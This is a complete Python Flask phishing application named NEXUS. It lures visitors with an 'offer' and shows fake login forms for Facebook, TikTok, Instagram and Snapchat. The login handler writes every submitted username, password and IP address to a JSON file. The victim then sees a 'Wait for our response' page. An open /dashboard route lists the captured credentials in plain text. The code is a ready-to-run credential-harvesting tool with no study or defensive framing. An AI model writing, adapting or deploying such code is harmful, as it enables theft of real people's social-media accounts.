#!/usr/bin/env python3
from flask import Flask, request
import json
import os
import datetime

app = Flask(__name__)
LOG_FILE = "captures.json"

if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        json.dump([], f)

PLATFORMS = {
    'facebook': {'name': 'Facebook', 'color': '#1877F2', 'icon': '👍'},
    'tiktok': {'name': 'TikTok', 'color': '#000000', 'icon': '🎵'},
    'instagram': {'name': 'Instagram', 'color': '#E4405F', 'icon': '📸'},
    'snapchat': {'name': 'Snapchat', 'color': '#FFFC00', 'icon': '👻'}
}

# ---------- HOMEPAGE (🧸 juu ya NEXUS, platforms wima) ----------
HTML_HOME = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 420px;
            width: 100%;
            text-align: center;
        }
        .brand-icon { font-size: 60px; margin-bottom: 6px; }
        h1 {
            font-size: 40px;
            font-weight: 700;
            color: #111;
            margin-bottom: 6px;
            letter-spacing: -0.5px;
        }
        .sub-head {
            font-size: 16px;
            color: #666;
            margin-bottom: 30px;
            font-weight: 400;
        }
        .platform-list {
            display: flex;
            flex-direction: column;
            gap: 16px;
            margin: 20px 0 30px 0;
        }
        .platform-item {
            background: #f5f5f5;
            padding: 18px 16px;
            border-radius: 14px;
            border: 1px solid #eee;
            text-decoration: none;
            color: #111;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: 0.2s;
            font-size: 18px;
            font-weight: 500;
        }
        .platform-item:active { transform: scale(0.97); }
        .platform-item .emoji { font-size: 28px; }
        .platform-item .pname { font-weight: 600; }
        .platform-item .badge {
            font-size: 12px;
            background: rgba(0,0,0,0.05);
            padding: 2px 12px;
            border-radius: 12px;
            color: #888;
            margin-left: auto;
        }
        .platform-item.facebook { background: #f0f2f5; border-color: #1877F2; }
        .platform-item.facebook .pname { color: #1877F2; }
        .platform-item.tiktok { background: #ffffff; border-color: #000000; }
        .platform-item.tiktok .pname { color: #000000; }
        .platform-item.instagram { background: #fafafa; border-color: #E4405F; }
        .platform-item.instagram .pname { color: #E4405F; }
        .platform-item.snapchat { background: #f5f5f5; border-color: #FFFC00; }
        .platform-item.snapchat .pname { color: #000000; }
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #999;
            line-height: 1.8;
        }
        .footer .name { color: #111; font-weight: 500; }
        .footer .chaos { color: #111; font-weight: 400; }
        .footer .contact { color: #111; font-weight: 400; }
    </style>
</head>
<body>
    <div class="container">
        <div class="brand-icon">🧸</div>
        <h1>NEXUS</h1>
        <p class="sub-head">Select the media you need to receive this offer.</p>
        <div class="platform-list">
            <a href="/login/facebook" class="platform-item facebook">
                <span class="emoji">👍</span>
                <span class="pname">Facebook</span>
                <span class="badge">🔒</span>
            </a>
            <a href="/login/tiktok" class="platform-item tiktok">
                <span class="emoji">🎵</span>
                <span class="pname">TikTok</span>
                <span class="badge">🔒</span>
            </a>
            <a href="/login/instagram" class="platform-item instagram">
                <span class="emoji">📸</span>
                <span class="pname">Instagram</span>
                <span class="badge">🔒</span>
            </a>
            <a href="/login/snapchat" class="platform-item snapchat">
                <span class="emoji">👻</span>
                <span class="pname">Snapchat</span>
                <span class="badge">🔒</span>
            </a>
        </div>
        <div class="footer">
            <div><span class="name">by Luiz Vad</span></div>
            <div><span class="chaos">Knowledge over chaos</span></div>
            <div><span class="contact">contact us : +255 662229320</span></div>
        </div>
    </div>
</body>
</html>
"""

# ---------- LOGIN PAGE (🧸 juu, "Enter your [Platform] account") ----------
def get_login_page(platform):
    platform_name = PLATFORMS[platform]['name']
    return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        html, body {{
            height: 100%;
            width: 100%;
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .container {{
            max-width: 400px;
            width: 100%;
            text-align: center;
            background: transparent;
            padding: 20px;
        }}
        .brand-icon {{ font-size: 60px; margin-bottom: 6px; }}
        h1 {{
            font-size: 38px;
            font-weight: 700;
            color: #111;
            margin-bottom: 6px;
            letter-spacing: -0.5px;
        }}
        .sub-head {{
            font-size: 16px;
            color: #666;
            margin-bottom: 30px;
            font-weight: 400;
        }}
        .input-group {{
            position: relative;
            margin: 10px 0;
        }}
        .input-group input {{
            width: 100%;
            padding: 16px 14px;
            padding-right: 48px;
            background: #f5f5f5;
            border: 1px solid #ddd;
            border-radius: 12px;
            font-size: 18px;
            color: #111;
            transition: 0.2s;
        }}
        .input-group input:focus {{
            outline: none;
            border-color: #007aff;
            background: #fff;
            box-shadow: 0 0 0 4px rgba(0,122,255,0.1);
        }}
        .toggle-password {{
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            font-size: 22px;
            cursor: pointer;
            padding: 0;
            color: #999;
            opacity: 0.6;
            line-height: 1;
        }}
        .toggle-password:hover {{ opacity: 1; }}
        .login-btn {{
            width: 100%;
            padding: 16px;
            background: #007aff;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 20px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
            transition: 0.2s;
        }}
        .login-btn:hover {{ background: #0066d9; }}
        .footer {{
            margin-top: 30px;
            font-size: 14px;
            color: #999;
            line-height: 1.8;
        }}
        .footer .name {{ color: #111; font-weight: 500; }}
        .footer .chaos {{ color: #111; font-weight: 400; }}
        .back {{
            display: inline-block;
            margin-top: 15px;
            color: #007aff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 500;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="brand-icon">🧸</div>
        <h1>NEXUS</h1>
        <p class="sub-head">Enter your {platform_name} account</p>
        <form action="/login/{platform}" method="POST">
            <div class="input-group">
                <input type="text" name="username" placeholder="User name" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder="Password" required>
                <button type="button" class="toggle-password" id="toggleBtn" onclick="togglePassword()">👁️</button>
            </div>
            <button type="submit" class="login-btn">Login</button>
        </form>
        <a href="/" class="back">← Go back</a>
        <div class="footer">
            <div><span class="name">by Luiz Vad</span></div>
            <div><span class="chaos">Knowledge over chaos</span></div>
        </div>
    </div>
    <script>
        function togglePassword() {{
            const input = document.getElementById('password');
            const btn = document.getElementById('toggleBtn');
            if (input.type === 'password') {{
                input.type = 'text';
                btn.textContent = '🙈';
            }} else {{
                input.type = 'password';
                btn.textContent = '👁️';
            }}
        }}
    </script>
</body>
</html>
"""

# ---------- SUCCESS PAGE (🧸 juu, "You're welcome", "Wait for our response") ----------
SUCCESS_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            height: 100%;
            width: 100%;
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            width: 100%;
            text-align: center;
            background: transparent;
            padding: 20px;
        }
        .brand-icon { font-size: 60px; margin-bottom: 6px; }
        h1 {
            font-size: 38px;
            font-weight: 700;
            color: #111;
            margin-bottom: 6px;
            letter-spacing: -0.5px;
        }
        .welcome {
            font-size: 24px;
            font-weight: 600;
            color: #111;
            margin-bottom: 6px;
        }
        .response {
            font-size: 18px;
            color: #666;
            margin-bottom: 30px;
        }
        .back-link {
            display: inline-block;
            color: #007aff;
            text-decoration: none;
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 30px;
        }
        .back-link:hover { text-decoration: underline; }
        .footer {
            font-size: 14px;
            color: #999;
            line-height: 1.8;
        }
        .footer .name { color: #111; font-weight: 500; }
        .footer .chaos { color: #111; font-weight: 400; }
    </style>
</head>
<body>
    <div class="container">
        <div class="brand-icon">🧸</div>
        <h1>NEXUS</h1>
        <div class="welcome">You're welcome</div>
        <div class="response">Wait for our response</div>
        <a href="/" class="back-link">← Go back</a>
        <div class="footer">
            <div><span class="name">by Luiz Vad</span></div>
            <div><span class="chaos">Knowledge over chaos</span></div>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return HTML_HOME

@app.route('/login/<platform>')
def login_page(platform):
    if platform not in PLATFORMS:
        return "Platform not found", 404
    return get_login_page(platform)

@app.route('/login/<platform>', methods=['POST'])
def login_post(platform):
    if platform not in PLATFORMS:
        return "Platform not found", 404
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    with open(LOG_FILE, "r") as f:
        logs = json.load(f)
    logs.append({
        "timestamp": str(datetime.datetime.now()),
        "platform": PLATFORMS[platform]['name'],
        "username": username,
        "password": password,
        "ip": ip
    })
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=4)
    return SUCCESS_PAGE

@app.route('/dashboard')
def dashboard():
    with open(LOG_FILE, "r") as f:
        logs = json.load(f)
    html = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NEXUS Dashboard</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;padding:20px;max-width:700px;margin:0 auto}
h1{font-size:32px;color:#111;margin-bottom:8px}.back{color:#007aff;text-decoration:none;font-size:16px}table{width:100%;border-collapse:collapse;margin-top:20px;font-size:14px}
th,td{border:1px solid #ddd;padding:10px 8px;text-align:left}th{background:#f5f5f5;color:#111;font-weight:600}tr:nth-child(even){background:#fafafa}.total{color:#666;margin-top:20px;font-size:14px}
</style></head>
<body><h1>📊 NEXUS Dashboard</h1><p><a href="/" class="back">← Go back</a></p><table><tr><th>Time</th><th>Platform</th><th>Name</th><th>Password</th><th>IP</th></tr>
    """
    for log in logs[-20:]:
        html += f"<tr><td>{log['timestamp']}</td><td>{log.get('platform', 'N/A')}</td><td>{log['username']}</td><td>{log['password']}</td><td>{log['ip']}</td></tr>"
    html += f"</table><p class='total'>Total attempts: {len(logs)}</p></body></html>"
    return html

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
